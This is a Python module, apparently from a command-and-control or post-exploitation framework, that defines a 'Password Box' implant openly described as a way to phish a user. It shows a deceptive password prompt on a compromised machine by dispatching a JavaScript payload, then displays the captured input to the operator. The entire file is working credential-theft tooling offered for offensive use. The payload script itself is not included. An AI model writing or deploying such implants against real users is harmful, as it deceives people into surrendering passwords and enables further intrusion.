import core.job
import core.implant
import uuid

class PasswordBoxJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        self.shell.print_plain("Input contents:")
        self.shell.print_plain(self.data)

class PasswordBoxImplant(core.implant.Implant):

    NAME = "Password Box"
    DESCRIPTION = "Try to phish a user"
    AUTHORS = ["zerosum0x0"]

    def load(self):
        self.options.register("Message", "You must enter your password to continue...", "Displayed to user")

    def run(self):
        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/phish/password_box.js", self.options)
        self.dispatch(payloads, PasswordBoxJob)
